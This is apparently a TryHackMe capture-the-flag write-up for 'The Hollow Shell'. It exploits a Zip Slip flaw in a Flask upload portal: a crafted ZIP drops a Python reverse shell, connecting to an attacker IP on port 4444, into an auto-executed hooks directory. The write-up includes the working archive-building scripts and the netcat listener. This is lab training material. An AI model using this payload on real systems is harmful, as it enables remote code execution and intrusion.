<p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# The Hollow Shell

| **Room Name** | The Hollow Shell |
|--------------|------------------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 |
| **Points** | 90 |
| **Category** | 🌐 Web |
| **Difficulty** | Medium |
| **Tags** | Web, File Upload, ZIP Slip, Path Traversal, Web Shell |
| **Status** | ✅ Completed |

## Room Information
```
Type: CTF Challenge
Difficulty: Medium
Category: Web Security

Description:
You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.
```
## Challenge Overview

**Hacker Holidays: Day 10 — The Hollow Shell**

The Shoreline Display portal allows guests to upload ZIP archives containing shell packages. By inspecting how the application handles uploaded files, you'll discover an insecure extraction process that can be abused to place files outside the intended directory. Successfully exploiting this vulnerability leads to remote code execution and ultimately the flag.

## Objectives

- Find the flag

## Solution

- I first read the challenge description and noticed the phrases `Slip something inside and hold it to your ear` and `the shell answers with a shell of your own`, which immediately suggested a file upload vulnerability leading to a web shell. Since the description also mentioned uploading a `shell` through the Shoreline Display portal, I focused my attention on the upload functionality and tested whether I could bypass its file validation

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/69394231-d261-4f5a-b992-d85de7cabe49" />
</p>

- I went to the website they gave me but that did not work for some reason. Typing `http` or `https` did not work
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/0684177c-15cb-423f-9f75-7f64a7168e47" />
</p>

- I searched on Google common port TryHackMe uses for their lab machines and port 5000 ended up working
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/6e58d533-71d5-4287-85ae-566a7802307d" />
</p>

- Now, I was on this page my first instinct to bypass this login was to look for hardcoded credentials because this has been a consistent theme with the challenges in this CTF and I did find these credentials by opening up the dev tools
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/f9808727-b7c1-4338-9f97-8139a62e094e" />
</p>

- After logging in, I was taken to a page that prompted me to upload a `.zip` file, referred to as a "shell." The upload feature accepts a ZIP archive containing a `shell.json` manifest along with any required assets. According to the page, the `shell.json` manifest defines the shell's name and asset list, and it can also include an optional `hooks` field. The documentation notes that these hooks are automatically processed by a background "theme worker" process. This immediately stood out as a potential code execution surface because it suggests that user supplied data is not being stored or displayed, but is instead being actively processed by a backend service

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/bba34bae-edba-4ad9-9318-0c63d89fc9f8" />
</p>

- To understand what the application was doing, I first uploaded a test shell containing only a `shell.json` manifest with an empty asset list
```
printf '%s\n' '{"name":"test","assets":[]}' > shell.json
zip baseline.zip shell.json
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/7f1f57bf-7bd0-4c2c-b52a-7e859cffbd9b" />
</p>

- I uploaded it to the application and clicked `HOLD IT TO THE ROOM'S EAR` button
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/82dba993-0ce6-465d-ab2a-60b0e0943bb6" />
</p>

- We can see that the application responded with a confirmation indicating the shell had been extracted to a randomly named subdirectory under `shells/`, and the uploaded `shell.json` was  retrievable at `http://10.67.149.26:5000/shells/00099062a90c/shell.json`. For me, this confirmed that the application extracts uploaded zips server side, and that the extraction directory is directly web accessible, which would become important for the vulnerability that follows

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2ebae941-8157-4b7b-b150-9a73e85b9c0a" />
</p>

- I visited the URL `http://10.67.149.26:5000/shells/00099062a90c/shell.json` as mentioned above 

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/885e50b9-0450-445c-8dee-2098c6dfd9d4" />
</p>

- To identify what technology the backend was using, I inspected the HTTP response headers with `curl -I http://10.67.149.26:5000/`. This helps determine what software is running behind the application, which can guide further testing. The response returned `Server: gunicorn`, indicating a Python WSGI application

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2ad551f1-b647-4e2d-ba4b-3dcbcd07c72c" />
</p>

- I further confirmed this by requesting a non-existent path (`curl -S "http://10.67.149.26:5000/path/path/path"`), which returned Flask/Werkzeug's characteristic default 404 error page, strongly suggesting the backend was built with Flask

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/6ddb7061-f70f-455b-b6f1-c4ee118f2051" />
</p>

- Now having confirmed that the extraction folder `(shells/<id>/)` is directly served over HTTP, the natural next question was whether the extraction logic validated the filenames inside the uploaded archive, or trusted them as they were. Zip archive extraction that blindly trusts internal paths is a well documented vulnerability class called Zip Slip, so I tested it directly where I crafted an archive containing an entry named `../../static/zipslip.css`

- I chose `static/` as the target because Flask applications conventionally serve a `static/` directory by default, making it both a more likely folder and one whose contents I could verify by simply requesting the resulting URL in a browser giving me an easy, visual confirmation of whether the traversal succeeded

- To test this theory, I wrote a short Python script to build a malicious archive rather than using the standard zip command line utility and this was necessary because command line zip tools typically normalize or reject `../` sequences in filenames, whereas Python's zipfile module writes archive entry names exactly as specified, with no path sanitization
```python
mkdir -p ~/zipslip_poc && cd ~/zipslip_poc
```
```python
cat > build_zipslip.py << 'EOF'
import json
import zipfile

manifest = {
    "name": "zipslip",
    "assets": []
}

with zipfile.ZipFile("zipslip.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../static/zipslip.css",
        "CONFIRMED\n"
    )

print("made zipslip.zip")
EOF
```
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/16a0cc45-f850-4ce1-bd72-32f1d4addec8" />
</p>

- Running `python3 build_zipslip.py` produced `zipslip.zip`. Inspecting the archive with `unzip -l zipslip.zip` confirmed the malicious entry name was preserved exactly as written, with no normalization applied at build time

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/763cb1fb-4792-463a-93d5-63e8e8b47362" />
</p>

- I uploaded the ZIP file to the web application
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/6d4d0a55-14c1-444b-be35-3af7fa72fb53" />
</p>

- However, we do not visit the path `http://10.67.149.26:5000/shells/43c7e191573f/shell.json` but rather we visit `http://10.67.149.26:5000/static/zipslip.css`. This confirmed that the `../../static/zipslip.css` file was extracted exactly as it appeared in the archive. Instead of being placed inside the intended `shells/<id>/` folder, it was written to the application's `static/` directory, which is publicly accessible without logging in

- This shows a Zip Slip vulnerability. The application does not check whether extracted file paths stay inside the intended destination folder. As a result, an attacker can create a malicious archive that writes files to other locations the application has permission to access

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/4a47b096-1a36-4979-90ed-dbe6c37d5dad" />
</p>

- After confirming that the Zip Slip vulnerability could write files anywhere on the server, the next goal was to see if this could be turned into running code. The upload page gave an important clue. It said uploaded shells could include automation hooks, and that a background theme worker would automatically process these hooks after a shell was uploaded. This suggested there was another program running in the background that actively reads and executes files from a specific `hooks` directory, rather than just serving files like the `shells/` or `static/` folders.

- Based on this, the idea was that if the Zip Slip vulnerability could write files anywhere, it might also be possible to place a malicious script into the `hooks` directory. If the background worker automatically processed files in that directory, it could execute the script, leading to remote code execution. Since the application appeared to use a standard Flask project layout (with folders such as `static/`), it was reasonable to assume there was also a `hooks/` directory at the same level, especially because the application's own interface referred to "hooks"

- I started up a listener first to catch the incoming shell
```
nc -lvnp 4444
```
<p align="center">
<img width="90%" height=90%" alt="image" src="https://github.com/user-attachments/assets/f53bf39f-565e-4da7-8985-32ddca5e1fcc" />
</p>

- I built the payload
```python
import json
import zipfile

LHOST = "10.67.101.127"
LPORT = 4444

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''import os
import pty
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))
for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)

print("Created reverse-shell.zip")
```

- I wrote the script and executed it 

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/21d9918b-29ca-488d-8295-2cfa7b1f075e" />
</p>

- We can confirm the malicious entry is as follows
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/b660d97f-457b-4c37-b3f8-8d8089578a1d" />
</p>

- I uploaded `reverse-shell.zip` in the web application and we got the shell
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/8a02ca46-b876-40ad-8811-c52c43155203" />
</p>

- I successfully retrieved the flag
```
find / -iname "*flag*" 2>/dev/null
```

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/4bed5e5d-9501-476d-8ac9-b8713b0b1fc2" />
</p>

## Skills Learned
- Identified file upload attack surfaces by analyzing challenge hints and application functionality
- Enumerated web application behavior through HTTP responses, developer tools, and direct interaction
- Discovered exposed client-side credentials using browser developer tools
- Analyzed ZIP upload workflows to understand server-side extraction behavior
- Verified web accessible extraction directories and mapped uploaded content to accessible URLs
- Performed backend fingerprinting using HTTP response headers and framework specific error pages
- Tested for Zip Slip path traversal by crafting malicious archive entry paths
- Created custom ZIP archives with Python's `zipfile` module to preserve traversal sequences
- Validated arbitrary file write by targeting the Flask `static/` directory
- Identified insecure archive extraction leading to arbitrary file placement outside the intended directory
- Escalated arbitrary file write into remote code execution by targeting an automatically processed hooks directory
- Developed a Python reverse shell payload for execution by a background worker
- Established an interactive reverse shell using Netcat

## Tools Used
- Firefox Developer Tools
- Google
- `curl`
- Python 3
- Python `zipfile` module
- Netcat (`nc`)
- Linux (`mkdir`, `cd`, `printf`, `zip`, `unzip`, `find`)

## Flag

🚩 **Flag:** `THM{********************}`
